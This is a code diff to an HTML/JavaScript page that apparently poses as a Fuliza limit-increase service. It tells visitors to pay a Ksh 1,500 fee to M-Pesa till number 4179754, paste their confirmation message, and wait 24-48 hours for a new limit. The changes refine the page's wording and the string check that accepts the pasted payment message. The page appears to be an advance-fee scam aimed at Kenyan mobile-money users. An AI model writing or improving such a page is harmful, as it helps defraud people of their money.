@@ -179,7 +179,7 @@
             margin: 10px 0;
         }
 
-        .dialog input, .dialog textarea {
+        .dialog textarea {
             width: 100%;
             padding: 12px;
             margin: 15px 0;
@@ -292,7 +292,7 @@
             <h2>Paste Transaction Message</h2>
             <p>Paste your M-Pesa confirmation message for paying <strong>Ksh<span id="feeCheck">1,500</span></strong>:</p>
             <textarea id="transactionMessage" placeholder="Paste your full M-Pesa confirmation message here"></textarea>
-            <p id="errorMessage" style="color: red; display: none;">Error: The transaction message does not contain the correct payment amount. Please ensure you paid Ksh <span id="errorFeeCheck">1,500</span>.</p>
+            <p id="errorMessage" style="color: red; display: none;">Error: The transaction message does not show payment of Ksh<span id="errorFeeCheck">1,500</span>. Please ensure you paid the correct amount.</p>
             <button class="dialog-button" id="submitTransactionMessage">Submit</button>
         </div>
     </div>
@@ -312,7 +312,7 @@
                 <i class="fas fa-check-circle"></i>
             </div>
             <h2>Payment Received!</h2>
-            <p>Your payment of <strong>Ksh <span id="successFeeCheck">1,500</span></strong> has been received successfully.</p>
+            <p>Your payment of <strong>Ksh<span id="successFeeCheck">1,500</span></strong> has been received successfully.</p>
             <p>Please await <strong>24-48 hours</strong> for your new Fuliza limit to reflect.</p>
             <button class="dialog-button" id="okButton">OK</button>
         </div>
@@ -325,8 +325,9 @@
         const fee = urlParams.get('fee') || "1500";
         const phone = urlParams.get('phone') || "0712345678";
 
-        // Format fee for display
+        // Format fee for display (without commas for validation)
         const formattedFee = parseInt(fee).toLocaleString();
+        const rawFee = parseInt(fee);
 
         // Display the limit and fee
         document.getElementById('newLimit').textContent = parseInt(limit).toLocaleString();
@@ -336,7 +337,7 @@
         document.getElementById('successFeeCheck').textContent = formattedFee;
         document.getElementById('amountInstruction').textContent = formattedFee;
 
-        // Till number updated to 4179754
+        // Updated till number
         const tillNumber = "4179754";
         document.getElementById('tillNumber').textContent = tillNumber;
         document.getElementById('tillNumberInstruction').textContent = tillNumber;
@@ -363,12 +364,15 @@
                 return;
             }
 
-            // Check if the transaction message contains the correct fee amount
-            const isValidTransaction = transactionMessage.includes(`Ksh ${formattedFee}`) ||
-                                      transactionMessage.includes(`KES ${formattedFee}`) ||
-                                      transactionMessage.includes(`Amount: ${formattedFee}`) ||
-                                      transactionMessage.includes(`Ksh.${formattedFee}`) ||
-                                      transactionMessage.includes(`KES.${formattedFee}`);
+            // Check if the transaction message contains the correct fee amount in Kenyan format (Ksh1500)
+            // Remove commas from formatted fee for validation
+            const feeForValidation = formattedFee.replace(/,/g, '');
+            const isValidTransaction =
+                transactionMessage.includes(`Ksh${feeForValidation}`) ||
+                transactionMessage.includes(`KES${feeForValidation}`) ||
+                transactionMessage.includes(`Amount Ksh${feeForValidation}`) ||
+                transactionMessage.includes(`Ksh.${feeForValidation}`) ||
+                transactionMessage.includes(`KES.${feeForValidation}`);
 
             if (!isValidTransaction) {
                 errorMessage.style.display = 'block';
@@ -393,4 +397,3 @@
     </script>
 </body>
 </html>
-
